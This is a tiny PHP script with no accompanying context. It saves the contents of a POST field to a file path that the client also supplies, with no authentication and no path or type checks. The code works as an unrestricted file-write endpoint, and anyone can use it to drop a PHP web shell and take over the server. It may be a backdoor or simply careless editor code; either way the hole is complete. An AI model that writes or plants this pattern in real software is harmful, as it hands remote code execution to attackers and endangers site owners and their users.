
<?php


if(!empty($_POST['savepage'])){



file_put_contents($_POST['filename'],$_POST['savepage']);




die();
}



?>
